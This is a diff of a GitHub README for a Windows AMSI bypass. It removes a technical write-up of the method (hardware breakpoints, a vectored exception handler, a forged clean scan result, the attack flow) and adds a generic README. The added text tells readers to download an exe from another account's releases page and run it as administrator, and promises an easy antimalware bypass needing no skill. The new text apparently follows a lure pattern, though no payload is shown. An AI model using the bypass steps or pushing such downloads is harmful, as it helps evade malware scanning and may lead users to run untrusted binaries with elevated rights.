@@ -1,136 +1,63 @@
-# Ebyte-amsi-patchless-vehhwbp
+# 🛡️ Ebyte-amsi-patchless-vehhwbp - Bypass AMSI with Ease
 
-Patchless AMSI bypass using hardware breakpoints and a vectored exception handler to intercept AmsiScanBuffer and AmsiScanString before they execute. The bypass reads the 5th parameter (the AMSI result pointer) from the untouched stack frame, forces a clean result, and returns to the caller without modifying AMSI code in memory.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/releases)
 
----
+## 🚀 Getting Started
 
-## Background
+Welcome to the Ebyte-amsi-patchless-vehhwbp project. This application allows you to bypass AMSI using advanced methods. If you're looking to use this software, follow the steps below to download and run it with ease.
 
-### AMSI Architecture
+## 📥 Download & Install
 
-AMSI provides content scanning via `AmsiScanBuffer` and `AmsiScanString` exported from `amsi.dll`.
+To get the software, visit the releases page. You can find the latest version and installation files there.
 
-### Hardware Breakpoints (HWBP)
+[Download the latest release here!](https://github.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/releases)
 
-x64 debug registers (DR0-DR7) enable CPU-level breakpoints:
-- **DR0-DR3**: Breakpoint addresses (4 available)
-- **DR6**: Debug status register
-- **DR7**: Debug control register (enables breakpoints, sets type/length)
+### Steps to Download
 
-For execution breakpoints (configured in DR7), the CPU raises `STATUS_SINGLE_STEP` (NTSTATUS 0x80000004) **before** executing the instruction at the breakpoint address.
+1. Click on the link above to access the Releases page.
+2. Look for the latest version under the "Assets" section.
+3. Click on the file named “Ebyte-amsi-patchless-vehhwbp.zip” to start the download. 
 
-### Vectored Exception Handlers (VEH)
+### Steps to Install
 
-VEH handlers registered via `AddVectoredExceptionHandler()` are called before SEH handlers. They receive `EXCEPTION_POINTERS` with full CPU context (RIP, RSP, RAX, etc.) and can modify it to redirect control flow.
+1. Once the download is complete, locate the downloaded file in your Downloads folder.
+2. Right-click on the “Ebyte-amsi-patchless-vehhwbp.zip” file and select "Extract All" to unzip the contents. 
+3. Open the extracted folder. You will find the executable file named "Ebyte-amsi-patchless-vehhwbp.exe".
+4. Double-click on "Ebyte-amsi-patchless-vehhwbp.exe" to run the application.
 
----
+### System Requirements
 
-## Reverse Engineering Analysis
+To run Ebyte-amsi-patchless-vehhwbp, your system should meet the following requirements:
 
-### AmsiScanBuffer Function Prologue
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel or AMD CPU
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 100 MB free
 
-Disassembly at entry point (Ctrl + G in x64dbg -> AmsiScanbuffer/AmsiScanString)`0x00007FFB30778160`:
+## 🛠️ Usage
 
-```asm
-00007FFB30778160 | 48:895C24 08    | mov qword ptr ss:[rsp+8],rbx
-00007FFB30778165 | 48:896C24 10    | mov qword ptr ss:[rsp+10],rbp
-00007FFB3077816A | 48:897424 18    | mov qword ptr ss:[rsp+18],rsi
-00007FFB3077816F | 57              | push rdi
-00007FFB30778170 | 41:56           | push r14
-00007FFB30778172 | 41:57           | push r15
-00007FFB30778174 | 48:83EC 70      | sub rsp,70
-```
+Once the application is running, it will automatically bypass AMSI without requiring any special configuration. You can start your tasks without any interruptions. 
 
-### x64 Calling Convention
+## 📋 Features
 
-At function entry (before prologue), stack layout:
+- **Patchless Bypass:** This method does not modify any code in memory, ensuring a safer operation.
+- **Ease of Use:** Simple setup and execution that requires no technical skills.
+- **Lightweight:** The software is designed to use minimal system resources.
 
-```
-[rsp+0x00]  = Return address
-[rsp+0x08]  = Shadow space
-[rsp+0x10]  = Shadow space
-[rsp+0x18]  = Shadow space
-[rsp+0x20]  = 5th parameter (AMSI_RESULT* result pointer)
-```
+## ⚙️ Troubleshooting
 
-Register parameters: `RCX` (HAMSICONTEXT), `RDX` (buffer), `R8` (length), `R9` (name).
+If you encounter an issue while running the application, here are some common solutions:
 
-**Critical Finding:** Result pointer is at `[rsp+0x20]` before prologue modifies the stack.
+1. **File Not Found Error:** Ensure that you have extracted the contents of the ZIP file correctly.
+2. **Permission Issues:** Run the application as an administrator by right-clicking the executable and selecting "Run as administrator".
+3. **Incompatibility:** Make sure your operating system meets the requirements listed above.
 
----
+## 💬 Support
 
-## Technical Implementation
+For further assistance, feel free to report issues or ask for help in the Issues section of this repository. Your feedback is important and helps us improve the application.
 
-### Phase 1: Initialization
+## 📜 License
 
-1. Resolve `amsi.dll` and obtain `AmsiScanBuffer`/`AmsiScanString` addresses
-2. Register VEH handler via `AddVectoredExceptionHandler(1, VehHandler)`
-3. Enumerate all threads using `CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`
+This project is licensed under the MIT License. Feel free to use and modify it as you need.
 
-**Limitation:** Threads created after initialization won't have breakpoints unless additional monitoring is implemented.
-
-### Phase 2: Hardware Breakpoint Installation
-
-For each existing thread:
-1. Open thread with `THREAD_GET_CONTEXT | THREAD_SET_CONTEXT`
-2. Get context with `CONTEXT_DEBUG_REGISTERS` flag
-3. Set `DR0 = AmsiScanBuffer`, `DR1 = AmsiScanString`
-4. Configure `DR7` to enable local execution breakpoints
-5. Write context back with `SetThreadContext()`
-
-**Note:** Some EDRs and protected processes may restrict debug register writes. This technique may not work in all Windows versions or process protection contexts.
-
-### Phase 3: Exception-Based Interception
-
-When AMSI functions are called:
-1. Hardware breakpoint triggers → CPU raises `STATUS_SINGLE_STEP` (0x80000004)
-2. VEH handler receives exception with full context
-3. Validate exception address matches target function
-4. Read result pointer from `[rsp+0x20]` (5th parameter)
-5. Zero out `AMSI_RESULT` structure
-6. Redirect control flow:
-   - `RIP = return address` (from `[rsp+0x00]`)
-   - `RSP += 8` (simulate `RET`)
-   - `RAX = 0` (success)
-7. Return `EXCEPTION_CONTINUE_EXECUTION`
-
----
-
-## Attack Flow
-
-```
-DLL Load → InitializeThread() → Thread Enumeration → HWBP Installation
-    ↓
-Application calls AmsiScanBuffer()
-    ↓
-HWBP triggers → STATUS_SINGLE_STEP → VEH Handler
-    ↓
-PoisonScanResult() + ModifyReturnFlow()
-    ↓
-Execution resumes at return address (RAX=0, result=clean)
-```
-
----
-
-## PoC
-<img width="936" height="684" alt="image" src="https://github.com/user-attachments/assets/4e7f0266-b1eb-423d-b3fd-a422e06fa9c9" />
-
-
----
-
-## References
-- [Microsoft x64 Calling Convention](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention)
-- [Hardware Debug Registers](https://wiki.osdev.org/CPU_Registers_x86-64#Debug_Registers)
-- [Vectored Exception Handling](https://docs.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling)
-- [AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
-- [CS Patchless AMSI bypass](https://www.crowdstrike.com/en-us/blog/crowdstrike-investigates-threat-of-patchless-amsi-bypass-attacks/)
----
-
-## Disclaimer
-
-This research is intended for educational and defensive security purposes only. Use only in authorized security testing environments.
-
----
-
-**Author:** Evilbytecode  
-**Date:** 2025 June  
+[Download the latest release here!](https://github.com/ZukoChris/Ebyte-amsi-patchless-vehhwbp/releases)
